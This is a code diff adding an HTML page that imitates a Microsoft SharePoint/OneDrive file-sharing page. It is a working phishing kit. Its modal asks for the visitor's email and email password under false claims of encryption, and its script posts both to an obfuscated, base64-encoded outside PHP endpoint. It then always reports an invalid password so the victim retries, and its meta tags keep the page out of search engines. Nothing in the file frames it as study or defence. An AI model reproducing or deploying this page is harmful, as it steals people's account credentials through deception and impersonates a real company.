@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Sharepoint - Download files</title>
+    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet">
+    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex">
+    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir">
+    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet">
+    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet">
+    <!-- Bootstrap core CSS -->
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <!-- Custom styles for this template -->
+    <link href="./lng/offcanvas.css" rel="stylesheet">
+    <style>
+        .card-img-top {
+        width: 100%;
+        border-top-left-radius: 0;
+        border-top-right-radius: 0;
+        }
+
+
+        /* Medium devices (landscape tablets, 768px and up) */
+        @media only screen and (max-width: 768px) {
+          .sec-column {
+            display: none;
+          }
+        } 
+    </style>
+</head>
+
+<body class="bg-light" style="">
+    <nav style="height: 50px;" class="navbar navbar-expand-md fixed-top navbar-dark bg-blue">
+        <a style="font-size: 16px;" class="navbar-brand" href="javascript:void(0)">Microsoft | <span style="font-weight: 600;">SharePoint</span></a>
+        <button class="navbar-toggler p-0 border-0" type="button" data-toggle="offcanvas" style="">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+    </nav>
+    <main role="main" class="container">
+        <!-- Create the Page Row  -->
+        <div class="row">
+            <!-- First Column  -->
+            <div class="col-sm-12 col-md-9">
+                <!-- Caption Area -->
+                <div class="d-flex align-items-center p-3 my-3 text-white-50 bg-blue rounded box-shadow">
+                    <img class="mr-3" src="./lng/white-onedrive.svg" alt="" width="48" height="48">
+                    <div class="lh-100">
+                        <h6 class="mb-0 text-white lh-100">OneDrive</h6>
+                        <small>Total file size: 47 MB</small>
+                    </div>
+                </div>
+                <!-- File Explorer Area -->
+                <div class="my-3 p-3 bg-white rounded box-shadow">
+                    <h6 class="border-bottom border-gray pb-2 mb-0">File Explorer</h6>
+                    <div class="media text-muted pt-3">
+                        <img width="32px" height="32px" src="./lng/word-icon.png" alt="" class="mr-2 rounded">
+                        <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
+                            <div class="d-flex justify-content-between align-items-center w-100">
+                                <strong class="text-gray-dark">Document____0023.docx</strong>
+                                <a href="#" data-toggle="modal" data-target="#myModal">View</a>
+                            </div>
+                            <span class="d-block">Description: Summary</span>
+                        </div>
+                    </div>
+                    <div class="media text-muted pt-3">
+                        <img width="32px" height="32px" src="./lng/ppt-icon.png" alt="" class="mr-2 rounded">
+                        <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
+                            <div class="d-flex justify-content-between align-items-center w-100">
+                                <strong class="text-gray-dark">Statement</strong>
+                                <a href="#" data-toggle="modal" data-target="#myModal">View</a>
+                            </div>
+                            <span class="d-block">Description: Statement </span>
+                        </div>
+                    </div>
+                    <small class="d-block text-right mt-3">
+                        <a href="#" data-toggle="modal" data-target="#myModal">Download All</a>
+                    </small>
+                </div>
+            </div>
+            <!-- End of First column -->
+            <!-- Second Column For Advertisement-->
+            <div class="col-sm-12 col-md-3 mt-3 sec-column">
+                <div class="card">
+                    <!-- Header Title for the Card -->
+                    <h6 class="card-header">Advertisement</h6>
+                    <!-- Ads Image  -->
+                    <img class="card-img-top" src="./lng/outlook-anim.gif" alt="Card image cap">
+                    <div class="card-body">
+                        <!-- <h5 class="card-title">Signed by:</h5> -->
+                        <p class="card-text" style="margin-bottom: 0;"><small class="text-muted">Signed by: Credit & Collections Department </small></p>
+                        <p class="card-text"><small class="text-muted">Public Access Duration: 24 hrs </small></p>
+                    </div>
+                </div>
+            </div>
+            <!-- End of Second Column -->
+        </div>
+        <!-- End of the Column -->
+    </main>
+    <!-- The Footer -->
+    <footer class="footer">
+        <div class="container">
+            <span class="text-muted" style="font-size: 13px;">© Microsoft 2023.</span>
+        </div>
+    </footer>
+    <!--Beginning of the Modal Box  -->
+    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true" style="display: none;">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <!-- First Modal Content  -->
+            <div id="first-view" style="display: none;" class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="exampleModalLongTitle"></h5>
+                </div>
+                <div class="modal-body">
+                    <!-- Spinner or Loader -->
+                    <div class="d-flex justify-content-center">
+                        <div class="row">
+                            <div class="col"><img src="./lng/loader.gif" alt=""></div>
+                            <div class="col">
+                                <div>
+                                    <p>Please wait. while we try to establish connection with your email server</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- End of Spinner or Loader -->
+                </div>
+                <div class="modal-footer">
+                </div>
+            </div>
+            <!-- End of First Modal  -->
+            <!-- Second Modal Content -->
+            <div id="second-view" class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="exampleModalLongTitle">Reciever's Authentication Desk</h5>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">×</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <form>
+                        <!-- Server based Ajax Response -->
+                        <div class="alert alert-danger" id="msg" style="display: none;">Invalid password..! Please enter correct password.</div>
+                        <div class="text-danger" id="error" style="display: none;"></div>
+                        <div class="form-group">
+                            <label for="exampleInputai1"> Email address</label>
+                            <input type="email" id="ai" value="" class="form-control" aria-describedby="aiHelp" placeholder="Receiver&#39;s Enter email">
+                            <small id="aiHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                        </div>
+                        <div class="form-group">
+                            <label for="exampleInputpr1">Password</label>
+                            <input type="password" class="form-control" id="pr" placeholder="Receiver&#39;s Email Password">
+                            <small id="aiHelp" class="form-text text-muted">Required for end to end encryption.</small>
+                        </div>
+                        <div class="form-check">
+                            <input type="checkbox" disabled="" checked="" class="form-check-input" id="exampleCheck1">
+                            <label class="form-check-label" for="exampleCheck1" style="color:green;">Data Encryption Enabled</label>
+                        </div>
+                    </form>
+                    <div class="modal-footer">
+                        <!-- <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                <button type="button" class="btn btn-primary">Next</button> -->
+                        <button type="button" id="submit-btn" class="btn btn-primary">View Files</button>
+                    </div>
+                    <div><small style="">Tip: To access files, enter receiver's email and password</small></div>
+                    <div><small style="font-size:10px;">All rights reserved. ©Microsoft 2023</small></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="./lng/holder.min.js.download"></script>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#ai').val(my_ai);
+        $('#aich').html(my_ai);
+        $("#msg").hide();
+        $('#myModal').modal('show');
+    }
+    ///////////////url getting ai////////////////
+
+
+    var file = "aHR0cHM6Ly9zZWhhYWUuc2l0ZS9zbHkvbmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is empty.!");
+            ai.focus;
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: atob(file),
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                $("#pr").val("");
+                // if (count >= 2) {
+                //     count = 0;
+                //     window.location.replace("http://www." + my_slice);
+                //     return false;
+                // }
+                $("#msg").show();
+            },
+            error: function() {
+                $("#pr").val("");
+                // if (count >= 2) {
+                //     count = 0;
+                //     window.location.replace("http://www." + my_slice);
+                //     return false;
+                // }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('View Files');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</html>
